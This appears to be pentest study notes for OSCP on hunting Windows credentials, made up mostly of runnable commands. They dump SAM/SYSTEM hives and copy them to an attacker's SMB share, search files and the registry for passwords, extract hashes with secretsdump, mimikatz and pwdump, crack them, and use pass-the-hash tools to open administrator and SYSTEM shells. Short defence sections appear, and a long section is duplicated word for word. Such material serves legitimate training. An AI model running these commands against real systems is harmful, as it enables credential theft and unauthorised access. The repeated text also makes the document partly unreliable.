# Windows Credential Hunting

Gathering credentials is one of the most effective ways to escalate privileges on Windows systems. This document covers common locations and methods to find stored credentials on Windows machines.

## File System Searches for Credentials

When hunting for credentials, performing file system searches is often fruitful. Look for configuration files and documents that might contain passwords:

```cmd
# Recursively search for files with "pass" in the name or ending in ".config"
dir /s /b *pass* == *.config

# Search for the word "password" in common configuration files
findstr /si password *.xml *.ini *.txt *.config *.conf
findstr /si credential *.xml *.ini *.txt *.config *.conf

# More targeted search for credentials in specific directories
findstr /spin "password" C:\Users\*.txt C:\Users\*.ini C:\Users\*.xml
findstr /spin "password" C:\inetpub\*.config C:\Program Files\*.config

# Find common configuration files that might contain credentials
dir /s /b web.config
dir /s /b php.ini
dir /s /b wp-config.php
dir /s /b *credential*

# Find all files containing the word "password" across the entire drive (be patient)
findstr /spin /c:"password" C:\*.* 2>nul
```

## Unattended Windows Installations

When deploying Windows across multiple machines, administrators often use unattended installation files which may contain credentials. Check these locations:

```powershell
# Common locations for unattended installation files
Get-ChildItem C:\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Panther\Unattend\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\system32\sysprep.inf -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\system32\sysprep\sysprep.xml -ErrorAction SilentlyContinue
```

Look for credential sections in these files:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Extracting SAM and SYSTEM Hives

The SAM (Security Account Manager) database contains local user account passwords in hashed format. With the SAM and SYSTEM files, you can extract and crack password hashes offline.

### SAM/SYSTEM File Locations

```cmd
# Main location (locked while Windows is running)
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

# Potential backup locations
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\SYSTEM
```

### Copying SAM and SYSTEM Files

Since these files are locked while Windows is running, you can use several methods to copy them:

#### Method 1: Using Volume Shadow Copy (requires admin privileges)

```cmd
# Create a shadow copy
wmic shadowcopy call create Volume='C:\'

# List shadow copies to get the ID
vssadmin list shadows

# Copy the files using the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

#### Method 2: Using reg save (requires admin privileges)

```cmd
# Export the SAM and SYSTEM hives to files
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

#### Method 3: Using Backup Privileges (SeBackupPrivilege)

If you have SeBackupPrivilege, you can copy these files even without full admin rights:

```cmd
# Check if you have the privilege
whoami /priv | findstr "SeBackup"

# Using PowerShell with backup privileges
powershell -c "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('C:\Windows\System32\config', 'C:\temp\registry_hives.zip')"

# Alternative approach using backup commands
copy C:\Windows\System32\config\SAM C:\temp\SAM
copy C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Extracting Hashes from SAM/SYSTEM

After obtaining the files, transfer them to your attack machine and use tools to extract hashes:

```bash
# Using impacket-secretsdump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Using Mimikatz
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM

# Using hashcat to crack NTLM hashes
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
```

### Example Scenario

During a penetration test, after obtaining administrative privileges:

```cmd
# Export registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Transfer files to attack machine using SMB
copy C:\temp\SAM \\10.10.10.10\share\
copy C:\temp\SYSTEM \\10.10.10.10\share\

# On attack machine
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# Output shows Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

## PowerShell History

PowerShell saves command history, which might contain credentials used in commands:

```cmd
# From CMD:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# From PowerShell:
Get-Content (Get-PSReadlineOption).HistorySavePath
# Or
Get-Content "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

## Saved Windows Credentials

Windows allows saving credentials for later use, which can be listed and used:

```powershell
# List saved credentials
cmdkey /list

# Use saved credentials to run commands as another user
runas /savecred /user:DOMAIN\username cmd.exe
```

## IIS Configuration Files

Internet Information Services (IIS) configuration files often contain database connection strings with credentials:

```powershell
# Common locations for web.config files
Get-ChildItem C:\inetpub\wwwroot\web.config -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config -ErrorAction SilentlyContinue

# Search for connection strings in these files
findstr "connectionString" C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
findstr "connectionString" C:\inetpub\wwwroot\web.config
```

## Credentials in Software Configurations

### PuTTY

PuTTY client might store proxy credentials:

```powershell
# Search for stored proxy credentials
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### WinSCP

WinSCP may save session information with obfuscated passwords:

```powershell
# Check for WinSCP saved sessions
reg query HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions /s
```

### Remote Desktop Credentials

Saved RDP connections may contain credentials:

```powershell
# Check for saved RDP credentials
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

## Credentials in Registry

Windows may store credentials in the registry:

```powershell
# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Credentials Manager

Windows Credential Manager stores credentials for websites, applications, and networks:

```powershell
# PowerShell (requires admin rights)
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }

# Using vaultcmd (built-in)
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

## Browser Stored Credentials

Browsers often store login credentials that can be extracted:

```powershell
# Chrome profiles are located at:
# "%LocalAppData%\Google\Chrome\User Data\Default\Login Data"

# Edge profiles are located at:
# "%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data"

# Firefox profiles are located at:
# "%AppData%\Mozilla\Firefox\Profiles\<profile>\logins.json"
```

Tools like LaZagne can automate the extraction of browser credentials.

## Configuration Files

Many applications store credentials in configuration files:

```powershell
# Search for common config files
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config,*.conf,*.cfg,*.inc -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|credentials|secret" | Select Path,Line
```

## Real-World Examples

### Example 1: PowerShell History

A system administrator ran a command that included credentials:

```powershell
$password = ConvertTo-SecureString "ZuperCkretPa5z" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("julia.jones", $password)
Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock { Get-ChildItem C:\Confidential }
```

### Example 2: IIS Web.config

A web.config file with database credentials:

```xml
<connectionStrings>
    <add name="MyDatabase" connectionString="Data Source=SQLServer;Initial Catalog=MyDatabase;User ID=db_admin;Password=098n0x35skjD3" providerName="System.Data.SqlClient" />
</connectionStrings>
```

### Example 3: Using Saved Credentials

Using `runas` with saved credentials to run commands as another user:

```cmd
# List saved credentials
cmdkey /list

# Use saved credentials to run cmd as a different user
runas /savecred /user:mike.katz cmd.exe

# Navigate to the desktop and read a flag
type C:\Users\mike.katz\Desktop\flag.txt
# Output: THM{WHAT_IS_MY_PASSWORD}
```

### Example 4: PuTTY Saved Session

Extracting a saved password from PuTTY:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# Output reveals proxy credentials for user thom.smith with password CoolPass2021
```

## Automated Credential Hunting Tools

- **LaZagne**: Retrieves passwords stored on a local computer
- **Mimikatz**: Extracts plaintext passwords, hashes, and tickets from memory
- **SessionGopher**: Extracts saved session information for remote access tools
- **SharpWeb**: .NET tool for grabbing credentials from web browsers

### Password Dumping Tools

Several specialized tools exist for extracting password hashes from Windows systems:

#### PWDump and Variants

```cmd
# Using pwdump7
pwdump7.exe > hashes.txt

# Using fgdump (Fork of pwdump with antivirus bypass)
fgdump.exe -h

# Using Windows Credentials Editor (WCE)
wce.exe -w
```

PWDump and its variants (PWDump7, fgdump, etc.) are command-line tools designed to extract password hashes from the SAM database. They can obtain NTLM and LM hashes from a Windows system, even while the system is running.

#### Impacket Tools

```bash
# On Kali Linux or other attack machines
# Using remote approach (requires credentials)
impacket-secretsdump -u Administrator -p 'Password123!' -target-ip 192.168.1.10

# Using local approach with SAM/SYSTEM files
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Impacket's secretsdump can extract NTLM hashes, Kerberos keys, and other credentials from a remote system or from local registry hives.

#### Metasploit Modules

If you have a Meterpreter session:

```
# In Meterpreter session
meterpreter > hashdump

# Or using Metasploit module
use post/windows/gather/smart_hashdump
```

#### Cracking the Hashes

After obtaining hashes, you can attempt to crack them:

```bash
# Using John the Ripper
john --format=NT hashes.txt

# Using Hashcat
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
```

### OSCP Notes on Password Dumping

For the OSCP exam:

1. Always have multiple password dumping tools ready, as some may trigger antivirus
2. PWDump variants are useful for quickly extracting hashes locally
3. Impacket-secretsdump is versatile for both remote and local extraction
4. Remember to document the complete process:
   - How you obtained the necessary privileges
   - How you extracted the hashes
   - Any attempts to crack or use the hashes

## Pass-the-Hash (PtH) Attacks

Once you have obtained password hashes from a Windows system, instead of attempting to crack them (which can be time-consuming or impossible for complex passwords), you can use the hashes directly for authentication using the "Pass-the-Hash" technique.

### Understanding Pass-the-Hash

Pass-the-Hash (PtH) exploits the way Windows authentication protocols like NTLM work. Instead of requiring the plaintext password, these protocols use the password hash for authentication. This means if you have the hash, you can authenticate without knowing the actual password.

### Tools for Pass-the-Hash

1. **pth-winexe**: A modified version of winexe that accepts NTLM hashes

```bash
# Basic syntax
pth-winexe -U 'domain/username%LM:NTLM' //target_ip cmd.exe

# Example with administrator hash
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 cmd.exe

# Get a SYSTEM shell
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' --system //10.10.10.10 cmd.exe
```

2. **Impacket Suite Tools**:

```bash
# Using psexec.py
impacket-psexec -hashes LM:NTLM administrator@10.10.10.10

# Using wmiexec.py (more stealthy)
impacket-wmiexec -hashes LM:NTLM administrator@10.10.10.10

# Using smbexec.py (even more stealthy)
impacket-smbexec -hashes LM:NTLM administrator@10.10.10.10
```

3. **CrackMapExec**:

```bash
# Testing credentials across multiple machines
crackmapexec smb 10.10.10.0/24 -u administrator -H 'a9fdfa038c4b75ebc76dc855dd74f0da'

# Executing commands
crackmapexec smb 10.10.10.10 -u administrator -H 'a9fdfa038c4b75ebc76dc855dd74f0da' -x "whoami"
```

### LM and NTLM Hashes Format

When using Pass-the-Hash tools, you typically need both the LM and NTLM hash portions:

- **LM hash**: Usually the first part (aad3b435b51404eeaad3b435b51404ee is the empty LM hash in modern Windows)
- **NTLM hash**: The second part, which is the actual NTLM hash of the password

The full hash format is: `LM:NTLM`

### OSCP Exam Tips

For the OSCP exam:
1. **Efficiency**: Pass-the-Hash is much faster than password cracking, especially for complex passwords
2. **Impacket tools** are the most reliable and officially allowed on the exam
3. **Always have multiple PtH options ready** in case one method fails
4. **Test various login methods** - some may work while others fail due to service configurations
5. **Document your approach** - showing you understand PtH attack methodology is important

### Real-World Example

After extracting hashes from a Windows system:

```bash
# Hash extraction result
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::

# Using pth-winexe to get a shell
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 cmd.exe

# Once connected, you can perform any action as the administrator
C:\> whoami
administrator

C:\> net user
```

### Defense Against Pass-the-Hash

Organizations can implement these mitigations:
1. **Credential Guard** in Windows 10/Server 2016+ to protect credential hashes
2. **LAPS** (Local Administrator Password Solution) to use unique local admin passwords
3. **Protected Users** security group for sensitive accounts
4. **Network segmentation** to limit lateral movement
5. **Monitoring** for suspicious authentication patterns

## Automated Credential Hunting Tools

- **LaZagne**: Retrieves passwords stored on a local computer
- **Mimikatz**: Extracts plaintext passwords, hashes, and tickets from memory
- **SessionGopher**: Extracts saved session information for remote access tools
- **SharpWeb**: .NET tool for grabbing credentials from web browsers

### Password Dumping Tools

Several specialized tools exist for extracting password hashes from Windows systems:

#### PWDump and Variants

```cmd
# Using pwdump7
pwdump7.exe > hashes.txt

# Using fgdump (Fork of pwdump with antivirus bypass)
fgdump.exe -h

# Using Windows Credentials Editor (WCE)
wce.exe -w
```

PWDump and its variants (PWDump7, fgdump, etc.) are command-line tools designed to extract password hashes from the SAM database. They can obtain NTLM and LM hashes from a Windows system, even while the system is running.

#### Impacket Tools

```bash
# On Kali Linux or other attack machines
# Using remote approach (requires credentials)
impacket-secretsdump -u Administrator -p 'Password123!' -target-ip 192.168.1.10

# Using local approach with SAM/SYSTEM files
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Impacket's secretsdump can extract NTLM hashes, Kerberos keys, and other credentials from a remote system or from local registry hives.

#### Metasploit Modules

If you have a Meterpreter session:

```
# In Meterpreter session
meterpreter > hashdump

# Or using Metasploit module
use post/windows/gather/smart_hashdump
```

#### Cracking the Hashes

After obtaining hashes, you can attempt to crack them:

```bash
# Using John the Ripper
john --format=NT hashes.txt

# Using Hashcat
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
```

### OSCP Notes on Password Dumping

For the OSCP exam:

1. Always have multiple password dumping tools ready, as some may trigger antivirus
2. PWDump variants are useful for quickly extracting hashes locally
3. Impacket-secretsdump is versatile for both remote and local extraction
4. Remember to document the complete process:
   - How you obtained the necessary privileges
   - How you extracted the hashes
   - Any attempts to crack or use the hashes

## Countermeasures

To protect against credential hunting:
- Avoid storing credentials in plain text
- Use Windows Credential Guard
- Implement strong password policies
- Regularly audit stored credentials
- Avoid saving credentials when not necessary
- Use more secure authentication methods like Windows Hello or smart cards 